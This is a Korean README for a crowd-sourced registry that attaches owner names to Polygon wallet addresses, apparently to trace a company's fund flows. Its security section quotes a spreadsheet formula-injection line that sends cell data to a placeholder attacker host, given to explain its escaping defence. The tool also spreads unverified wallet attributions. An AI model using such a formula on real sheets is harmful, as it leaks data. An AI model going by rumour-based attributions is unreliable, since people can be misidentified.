# 폴리곤 지갑 등록소

폴리곤 체인의 지갑 주소에 **"누구 것인지"** 이름을 붙여 함께 모으는 도구입니다.

체인 위의 거래 기록은 누구나 볼 수 있지만 거기 찍힌 것은 `0x`로 시작하는 42자리 주소뿐입니다.
그 주소가 누구 것인지 알아야 흐름이 읽힙니다. 한 사람이 아는 것은 한두 개지만, 여럿이 아는 것을 모으면 지도가 됩니다.

**최종 목표** — 회사와 관련 인물의 주소를 충분히 모아, 나중에 개인 거래내역만 보고도 자금이 어디서 들어와 어디로 빠져나갔는지 따라갈 수 있게 하는 것.

---

## 구성

| 파일 | 하는 일 |
|---|---|
| `지갑등록소.html` | 등록·추천·현황 웹페이지. 카페에 링크로 올리는 것이 이 파일입니다. |
| `apps_script/Code.gs` | 백엔드. 구글 스프레드시트에 등록·추천을 저장합니다. |
| `labels.json` | 운영진이 확정한 라벨 사전. 등록소와 확장 프로그램이 함께 읽습니다. |
| `폴리곤스캔_이름표.user.js` | 폴리곤스캔 화면의 주소를 등록된 이름으로 바꿔 보여주는 확장 스크립트. |
| `카페_공지글.md` | 네이버 카페에 붙여넣을 안내글 초안. |

---

## 설치 (순서대로)

### 1. 백엔드 만들기 — 10분

1. 구글 스프레드시트를 새로 만듭니다.
2. **확장 프로그램 → Apps Script** 를 엽니다.
3. `apps_script/Code.gs` 내용을 통째로 붙여넣고 저장합니다.
4. 위쪽 함수 목록에서 **`setup`** 을 고르고 **▶ 실행** 합니다. (최초 1회, 권한 승인 필요)
   → `entries` · `votes` · `lookups` 시트 3개가 생깁니다.
5. **배포 → 새 배포 → 유형 '웹 앱'**
   - 실행 계정: **나**
   - 액세스 권한: **모든 사용자** ← 반드시 이 값이어야 카페 회원이 쓸 수 있습니다
6. 나오는 `.../exec` 주소를 복사해 둡니다.

> 코드를 고친 뒤에는 **배포 → 배포 관리 → 연필(수정) → 버전 '새 버전' → 배포** 로 기존 배포를 수정하세요.
> 새 배포를 또 만들면 주소가 바뀝니다.

### 2. 페이지에 주소 넣기

`지갑등록소.html` 맨 아래 `<script>` 첫 부분:

```js
var API_URL    = 'https://script.google.com/macros/s/....../exec';   // 5단계에서 복사한 주소
var LABELS_URL = 'labels.json';                                       // GitHub raw 주소 권장
```

`LABELS_URL` 은 GitHub Pages로 올릴 경우 같은 폴더의 `labels.json` 이라 그대로 두어도 됩니다.

### 3. 페이지 올리기

GitHub Pages가 가장 간단합니다. 저장소 **Settings → Pages → Branch: main / (root)** 로 켜면
`https://<계정>.github.io/<저장소>/지갑등록소.html` 로 접속됩니다. 이 주소를 카페에 올립니다.

### 4. (선택) 폴리곤스캔 이름표

크롬에 [Tampermonkey](https://www.tampermonkey.net/) 를 설치한 뒤 `폴리곤스캔_이름표.user.js` 를 추가하고,
파일 위쪽 두 줄을 채웁니다.

```js
const LABELS_URL   = 'https://raw.githubusercontent.com/<계정>/<저장소>/main/labels.json';
const REGISTRY_URL = 'https://script.google.com/macros/s/....../exec';
```

폴리곤스캔에서 주소가 등록된 이름으로 바뀌어 보이고, 그 자리에서 바로 이름을 달 수 있습니다.

## 어떻게 굴러가나

### 같은 이름은 하나로 묶입니다

`강남센터 총판` · `강남 센터 총판` · `강남센터총판` 은 **같은 이름**으로 봅니다.
세 사람이 따로 올려도 표가 갈리지 않고 **"제보 3명"** 짜리 후보 하나가 됩니다.

### 신뢰도

| 등급 | 조건 |
|---|---|
| **확정** | 운영진이 `labels.json` 에 `confidence: "A"` 로 넣은 것 — **커뮤니티가 못 바꿉니다** |
| **유력** | 제보자 2명 이상 **또는** 추천 3표 이상, 그리고 "아니다"가 0 |
| **가능성** | 추천 1표 이상 |
| **미검증** | 제보 1건뿐 |

점수 = `추천×2 − 아니다×3 + (제보자수−1)×4 + (출처종류−1)×2 + 출처가중치`

**서로 다른 사람이 서로 다른 경로로 같은 이름을 냈을 때**가 가장 강합니다.
그래서 "어떻게 아셨나요?"를 필수로 받습니다 — 나중에 증거력을 가르는 항목입니다.

| 출처 | 가중치 |
|---|---|
| 내가 이 주소로 보냈음 / 받았음 / 공지에 있던 주소 | 3 |
| 단톡방에서 안내받음 / 남의 내역에서 봄 / 거래 흐름으로 추정 | 2 |
| 들어서 알고 있음 | 1 |

### 목록은 자금이 흐르는 순서로 묶입니다

전체 현황 탭은 카드 더미가 아니라 **단계별 목록**입니다. 위에서 아래로 읽으면 그대로 돈의 경로가 됩니다.

| 단계 | 들어가는 분류 |
|---|---|
| ① 돈이 모이는 곳 | 회사 수금 |
| ② 거쳐 가는 곳 | 경유 · 브릿지 |
| ③ 돈이 나가는 곳 | 회사 지급 |
| ④ 받는 사람들 | 총판·센터 · 개인 |
| ⑤ 현금이 되는 곳 | 환전·OTC |
| ⑥ 추적 종착점 | 거래소 |
| ⚠ 조심할 것 | 사칭 · 더스트 |
| 분류 안 된 것 / 아직 이름 없음 | 나머지 |

- 맨 위 **칩**을 누르면 그 단계만 봅니다. 개수도 같이 나옵니다.
- 한 줄은 `신뢰도 · 이름 · 분류 · 추천/제보 수 · 주소` 요약이고, **누르면 펼쳐져** 후보·근거·추천 버튼·등록 폼이 나옵니다.
- 단계마다 20줄씩 먼저 보여주고 `더 보기`로 늘립니다. 단계별로 끊기 때문에 뒤쪽 단계가 통째로 잘리는 일이 없습니다.
- 정렬을 `신뢰도순 / 최신순 / 추천순`으로 바꾸면 묶음 없이 한 줄로 쭉 봅니다.

### 추천 중복 막기

닉네임만으로 중복을 판정하면 **이름을 바꿔가며 추천을 무한정 누를 수 있습니다.**
그래서 브라우저마다 임의의 값(`did`)을 만들어 localStorage 에 저장하고, 등록·추천에 함께 보냅니다.
서버는 **닉네임과 브라우저 중 하나라도 겹치면** 이미 참여한 것으로 봅니다.

- 한 지갑의 한 이름에는 브라우저당 한 번만 추천/반대
- 닉네임을 바꿔도 자기가 올린 이름에는 추천 불가
- 닉네임을 바꿔가며 `제보 N명` 을 부풀리는 것도 차단
- 시간당 쓰기 제한도 닉네임·브라우저 양쪽으로 셉니다

**한계는 분명합니다.** 브라우저 데이터를 지우거나 시크릿 창·다른 기기를 쓰면 우회됩니다.
로그인을 받지 않는 이상 완전 차단은 불가능합니다. 다만
① 비용이 "닉네임 바꾸기(0초)"에서 "브라우저 데이터 지우기"로 올라가고,
② `did` 가 시트에 남아 **한 브라우저가 몰표를 준 흔적을 나중에 찾아 지울 수 있습니다.**
③ 중요한 주소는 `confidence: "A"` 로 박아두면 애초에 추천으로 못 바꿉니다.

> `did` 는 개인정보가 아니라 그 브라우저에만 저장되는 임의의 문자열입니다.

### 실시간 화면

등록·추천이 일어나는 게 바로 보이도록 구성했습니다.

- **맨 위 실시간 바** — 스크롤해도 위에 붙어 있습니다. `● 실시간 · 지금 N명 보는 중 · 최근 활동 한 줄`
  새 소식이 오면 티커가 아래에서 위로 올라옵니다.
- **실시간 탭** — 누가 무엇을 등록·추천·반대했는지 시간순으로 흐릅니다.
  새로 들어온 항목은 파랗게 번쩍이고, 시간은 `방금 / 30초 전 / 2분 전`으로 1초마다 갱신됩니다.
- **숫자 애니메이션** — 등록 수가 늘면 세면서 올라갑니다.
- **최근 움직인 지갑** — 전체 현황 목록에서 왼쪽에 파란 줄이 그어집니다 (최근 10분).
- **알림** — 남이 등록하면 `○○님이 "강남센터 총판" 등록` 처럼 내용까지 띄웁니다.

**확인 주기는 상황에 따라 달라집니다.** 무료 한도를 아끼면서 활동 중일 때만 빠르게 봅니다.

| 상태 | 주기 |
|---|---|
| 보고 있고 방금 뭔가 했을 때 | 5초 |
| 보고 있지만 가만히 있을 때 | 15초 |
| 다른 탭에 가 있을 때 | 30초 |

`지금 N명` 은 확인 요청에 얹어서 세므로 **요청이 더 늘지 않습니다.** 시트도 건드리지 않고 캐시만 씁니다.
잠금을 걸지 않아 몇 명 어긋날 수 있는 어림값입니다.

> 실시간 기능은 **`Code.gs` 를 새로 배포해야** 동작합니다. 예전 백엔드면 피드가 비어 있고
> 접속자 수 대신 `연결됨` 만 표시됩니다(나머지 기능은 그대로 동작).

### 등록소가 잠깐 안 될 때

Apps Script 는 접속이 몰리면 간헐적으로 응답하지 않습니다.
페이지는 **3번까지 다시 시도**하고, 그래도 안 되면 목록을 지우지 않고
위에 안내 띠와 `다시 시도` 버튼만 띄웁니다. 이때도 `labels.json` 의 운영 라벨은 그대로 보입니다.

### 도와주세요 (수배 목록)

누군가 주소를 확인했는데 이름이 없으면 `lookups` 시트에 조회수가 쌓입니다.
**여러 사람이 찾아본 주소일수록 위로** 올라갑니다. 누가 이름을 달면 목록에서 자동으로 빠집니다.

운영진이 먼저 물어보고 싶은 주소는 `labels.json` 의 `wanted` 에 넣으면 맨 위에 고정됩니다.

```json
"wanted": [
  { "address": "0x....", "reason": "회사 지급지갑이 가장 큰 금액을 보낸 주소" }
]
```

### 개인정보 차단

전화번호 · 주민번호 · 계좌번호로 보이는 숫자는 **화면과 서버 양쪽에서** 막습니다.
지갑 이름에는 닉네임이나 직책만 씁니다.

## 모은 데이터 쓰기

전체 현황 탭 아래 두 개의 내려받기 버튼이 있습니다.

- **labels.json** — 확장 프로그램이 읽는 사전. 커뮤니티 등록분 중 기준을 넘은 것만 `(추정)` 을 붙여 넣습니다.
  받은 파일을 저장소의 `labels.json` 에 덮어쓰면 모두의 폴리곤스캔 화면에 반영됩니다.
- **CSV** — 자금 흐름을 정리할 때 쓰는 표. `주소 / 대표이름 / 분류 / 신뢰도 / 추천 / 제보자수 / 제보자 / 출처 / 시점 / 소속 / 근거 / 폴리곤스캔 링크`

자금추적은 **주소에 이름이 붙어 있어야** 시작할 수 있습니다.
CSV 의 `주소 → 이름` 만 있으면 폴리곤스캔에서 받은 거래내역에 그대로 붙여 흐름을 읽을 수 있습니다.

## 운영 시 알아둘 것

- **Apps Script 무료 한도** — 동시 실행 30개. 페이지는 8초마다 "바뀐 게 있는지"만 묻는 아주 가벼운 요청을 보내고,
  값이 달라졌을 때만 전체를 다시 받습니다. 수십 명이 동시에 봐도 견딥니다.
- **쓰기 제한** — 닉네임 하나당 시간당 80회. `Code.gs` 의 `MAX_WRITE_PER_HOUR` 에서 조절합니다.
- **잘못 올라온 항목 삭제** — `Code.gs` 의 `ADMIN_KEY` 에 아무 문자열이나 넣고 배포한 뒤,
  `{action:'remove', id:'E....', key:'그 문자열'}` 을 POST 하면 해당 항목이 숨겨집니다.
  (시트의 `status` 칸에 직접 `deleted` 를 적어도 됩니다.)
- **백업** — 스프레드시트가 원본입니다. 가끔 사본을 떠 두세요.

## 막아둔 것 / 못 막는 것

등록소 주소는 누구나 알 수 있으므로, 서버가 들어오는 값을 믿지 않는다는 전제로 짜여 있습니다.

**막아둔 것**

| 항목 | 처리 |
|---|---|
| 수식 인젝션 | `=`, `+`, `-`, `@` 로 시작하는 값은 시트에 넣기 전 앞에 `'` 를 붙입니다. 안 그러면 `=IMPORTXML("https://공격자/?d="&A1,"//a")` 같은 이름 하나로 **운영자가 시트를 여는 순간 내용이 새어 나갑니다.** 내려받는 CSV 도 같은 처리를 합니다 |
| 화면 스크립트 삽입(XSS) | 화면에 나가는 모든 값은 `esc()` 를 거칩니다 |
| 분류·출처 위조 | 정해진 값만 받고, 나머지는 `unknown` / 빈값 처리 |
| 제어문자 | 저장 전 제거 |
| 개인정보 | 전화·주민·계좌로 보이는 숫자는 화면과 서버 양쪽에서 거부 |
| 추천 중복 | 닉네임 + 브라우저 양쪽으로 판정 |
| 조회기록 폭주 | 브라우저당 시간당 60회, 전체 3000건 상한. 넘으면 오류 없이 기록만 건너뜁니다 |
| 링크로 목록 오염 | `?add=` 로 받는 주소는 20개까지 |
| 삭제된 글 투표 | 거부 |
| JSONP 콜백 | 이름 형식 검사 |

**못 막는 것 (알고 쓰셔야 합니다)**

- **브라우저를 바꾸거나 데이터를 지우면 추천 중복 방지는 우회됩니다.** 로그인을 받지 않는 한 완전 차단은 불가능합니다.
  대신 `did` 가 시트에 남으니 **몰표 흔적을 찾아 지울 수 있습니다.**
- **반대(아니다) 표를 몰아 정상 이름을 묻어버리는 것**도 같은 방식으로 가능합니다.
  중요한 주소는 `confidence: "A"` 로 박아두면 추천·반대로 흔들리지 않습니다.
- 등록이 수천 건을 넘어가면 쓰기마다 시트를 통째로 읽는 구조라 느려집니다.
  그때는 시트를 갈아끼우고 오래된 기록을 옮기세요.

## 공개 저장소로 둘 때 알아둘 것

**등록소 주소(`/exec`)는 구조상 숨길 수 없습니다.** 페이지 소스에 들어가야 동작하므로,
저장소를 비공개로 돌려도 브라우저 개발자도구를 열면 누구나 봅니다.
즉 **저장소 공개 여부와 무관하게 누구나 쓰기 요청을 보낼 수 있습니다.** 실제 방어선은 아래 셋입니다.

1. **확정(A) 라벨 잠금** — `confidence: "A"` 인 주소는 커뮤니티 제보가 **이름도 분류도 못 바꿉니다.**
   이게 없으면 아무나 몰려와 추천을 몰아주는 것만으로 확정 라벨을 뒤집을 수 있습니다.
   확실한 주소는 반드시 `A` 로 박아두세요. (제보는 후보 목록에 그대로 남아 보입니다.)
2. **백업** — 스프레드시트가 원본입니다. 주기적으로 사본을 떠 두세요. 스팸이 들어오면 되돌릴 방법은 이것뿐입니다.
3. **관리자 키는 코드에 적지 마세요.** Apps Script 편집기 > 프로젝트 설정 > 스크립트 속성에
   `ADMIN_KEY` 로 넣습니다. `Code.gs` 에 적어서 커밋하면 그대로 공개됩니다.

저장소 **이름을 바꾸는 것은 실익이 거의 없습니다.** `labels.json` 안의 프로젝트명·토큰 이름이
그 자체로 검색 키워드라, 이름만 바꿔도 내용으로 찾힙니다. 노출이 걱정되면 이름이 아니라
**계정을 분리**하는 편이 낫습니다. 커밋 작성자 이메일도 공개되므로
`git config user.email` 을 GitHub noreply 주소로 맞춰두세요.

## 주의

여기 모이는 이름은 **확정된 사실이 아니라 커뮤니티가 모은 추정**입니다.
특정 개인·법인의 위법행위를 단정하지 않으며, 실명·연락처는 기록하지 않습니다.
정정·삭제 요청은 운영진이 확인 후 처리합니다.
